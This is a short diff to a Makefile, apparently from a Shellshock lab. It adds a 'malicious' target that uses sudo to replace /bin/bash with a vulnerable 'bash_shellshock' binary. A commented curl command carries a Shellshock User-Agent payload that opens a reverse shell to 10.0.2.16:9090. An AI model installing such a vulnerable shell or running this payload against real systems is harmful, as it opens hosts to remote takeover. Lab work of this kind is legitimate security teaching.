@@ -27,3 +27,8 @@ clean:
 
 initdb:
 		echo .quit | ./sqlite3 -init setup.sql rtbb.sqlite3
+
+malicious:
+		@sudo mv /bin/bash /
+		@sudo mv /bin/bash_shellshock /bin/bash
+		# curl --header 'User-Agent: () { :; }; echo; /bin/bash -i > /dev/tcp/10.0.2.16/9090 0<&1 2>&1' http://localhost:8000/cgi-bin/home.cgi
